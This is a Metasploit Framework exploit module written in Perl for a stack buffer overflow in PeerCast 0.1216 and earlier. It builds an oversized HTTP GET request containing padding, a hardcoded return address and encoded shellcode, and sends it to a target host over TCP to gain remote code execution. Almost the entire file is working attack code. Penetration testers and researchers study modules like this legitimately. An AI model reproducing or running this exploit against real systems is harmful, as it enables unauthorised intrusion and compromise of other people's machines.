
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::peercast_url_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'PeerCast <= 0.1216 URL Handling Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'linux'],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 7144],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 200,
		'BadChars'  => "\x00",
		'Keys'      => ['-bind'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in PeerCast <= v0.1216. 
	The vulnerability is caused due to a boundary error within the
	handling of URL parameters.
}),

	'Refs'  =>
	  [
	  	['OSVDB', '23777'],
		['BID', '17040'],
		['URL', 'http://www.infigo.hr/in_focus/INFIGO-2006-03-01'],
	  ],

	'DefaultTarget' => 0,

	'Targets' =>
	  [
		['PeerCast v0.1212 binary', 0x080922f7 ],
	  ],

	'Keys' => ['peercast'],

	'DisclosureDate' => 'March 8 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $offset      = $self->GetVar('OFFSET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $sploit =
	  "GET /stream/?". Pex::Text::AlphaNumText(780).
	  pack('V', $target->[1]). $shellcode. "\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;

